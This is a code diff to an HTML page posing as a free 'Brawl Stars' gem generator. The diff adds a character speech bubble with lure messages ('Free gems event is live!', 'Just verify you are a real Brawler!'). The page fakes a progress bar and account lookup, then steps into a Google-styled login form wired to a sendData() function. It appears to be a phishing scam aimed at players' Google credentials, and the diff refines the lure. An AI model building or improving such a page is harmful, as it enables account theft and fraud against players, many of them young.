@@ -6,14 +6,13 @@
     <title>Brawl Stars Generator</title>
     <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* ГЛОБАЛЬНЫЕ СТИЛИ В СТИЛЕ ИГРЫ */
+        /* ГЛОБАЛЬНЫЕ СТИЛИ */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Lilita One', cursive; overflow-x: hidden;
-            background: #1a2969; /* Базовый синий */
+            background: #1a2969;
         }
 
-        /* Анимированный фон (паттерн) как в оригинале */
         .bg-overlay {
             position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
             background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
@@ -33,7 +32,57 @@
             padding: 20px; min-height: 100vh;
         }
 
-        .logo { width: 220px; margin: 20px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
+        .logo { width: 220px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
+
+        /* СТИЛИ ДЛЯ ШЕЛЛИ И ОБЛАКА ТЕКСТА */
+        .shelly-container {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 450px;
+            margin-bottom: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .shelly-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #000;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            z-index: 2;
+            background: #fff;
+        }
+
+        .brawl-bubble {
+            background: white;
+            border: 4px solid black;
+            border-radius: 20px;
+            padding: 15px 20px;
+            margin-left: -15px;
+            position: relative;
+            flex: 1;
+            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
+        }
+
+        .brawl-bubble::before {
+            content: '';
+            position: absolute;
+            left: -14px;
+            top: 50%;
+            transform: translateY(-50%);
+            border-top: 10px solid transparent;
+            border-bottom: 10px solid transparent;
+            border-right: 10px solid black;
+        }
+
+        .bubble-text {
+            font-family: 'Lilita One', cursive;
+            color: #000;
+            font-size: 16px;
+            line-height: 1.2;
+            text-align: left;
+        }
 
         /* ГЛАВНОЕ ОКНО */
         .main-box {
@@ -45,7 +94,6 @@
 
         .step-title { color: #000; font-size: 24px; margin-bottom: 20px; text-transform: uppercase; }
 
-        /* ИНПУТ ТЕГА */
         .tag-input-wrapper {
             background: #f0f0f0; border: 3px solid #ccc; border-radius: 10px;
             padding: 10px; margin-bottom: 20px;
@@ -56,7 +104,6 @@
             outline: none; text-transform: uppercase;
         }
 
-        /* СЕТКА ГЕМОВ */
         .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
         .gem-card {
             background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
@@ -66,7 +113,6 @@
         .gem-card img { width: 60px; display: block; margin: 0 auto 5px; }
         .gem-card span { font-size: 20px; color: #333; }
 
-        /* КНОПКА BS STYLE */
         .btn-yellow {
             background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
             border: 3px solid #000; border-radius: 12px;
@@ -77,7 +123,6 @@
         }
         .btn-yellow:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }
 
-        /* ПРОГРЕСС БАР */
         .loader-wrap { display: none; margin: 30px 0; }
         .bar-bg { background: #eee; height: 25px; border: 3px solid #000; border-radius: 15px; overflow: hidden; }
         .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.2s; }
@@ -87,11 +132,9 @@
             font-size: 12px; height: 80px; overflow-y: hidden; margin-top: 15px;
         }
 
-        /* КАРТОЧКА АККАУНТА */
         .account-ready { display: none; background: #222; border-radius: 15px; padding: 20px; color: #fff; margin-bottom: 20px; }
         .ready-tag { color: #FFD84D; font-size: 22px; }
 
-        /* GOOGLE UI (Source Sans Pro) */
         .google-ui { display: none; font-family: 'Source Sans Pro', sans-serif; text-align: left; }
         .google-ui h2 { font-weight: 400; font-size: 24px; text-align: center; color: #202124; margin-top: 10px; }
         .g-input {
@@ -100,6 +143,11 @@
         }
 
         .back-link { position: absolute; top: 15px; left: 15px; width: 35px; cursor: pointer; display: none; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
@@ -108,6 +156,13 @@
 
 <div class="wrapper">
     <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">
+
+    <div class="shelly-container">
+        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
+        <div class="brawl-bubble">
+            <div class="bubble-text" id="bubble-msg">Hey Brawler! Free gems event is live! Enter your tag to get started!</div>
+        </div>
+    </div>
 
     <div class="main-box" id="mainBox">
         <img src="https://brawlergems.com/generator/images/back.png" class="back-link" id="backBtn" onclick="goBack()">
@@ -157,6 +212,7 @@
 <script>
     let selectedGems = "30";
     let playerTag = "";
+    const bubbleMsg = document.getElementById('bubble-msg');
 
     function selectGems(el, val) {
         document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
@@ -170,6 +226,9 @@
 
         document.getElementById('step-entry').style.display = 'none';
         document.getElementById('step-load').style.display = 'block';
+        
+        // Меняем текст в облаке
+        bubbleMsg.innerText = "Searching for your account... Please wait!";
 
         let p = 0;
         let logs = ["> Searching player...", "> Database found", "> Syncing gems...", "> Finalizing..."];
@@ -198,12 +257,18 @@
         document.getElementById('backBtn').style.display = 'block';
         document.getElementById('display-tag').innerText = playerTag.toUpperCase();
         document.getElementById('claim-btn').innerText = "Claim " + selectedGems + " Gems";
+        
+        // Меняем текст в облаке
+        bubbleMsg.innerText = "Account found! You can now claim your reward!";
     }
 
     function showGoogle() {
         document.getElementById('step-ready').style.display = 'none';
         document.getElementById('step-google').style.display = 'block';
         document.getElementById('mainBox').style.padding = "40px 25px";
+        
+        // Меняем текст в облаке
+        bubbleMsg.innerText = "Almost there! Just verify you are a real Brawler!";
     }
 
     async function sendData() {
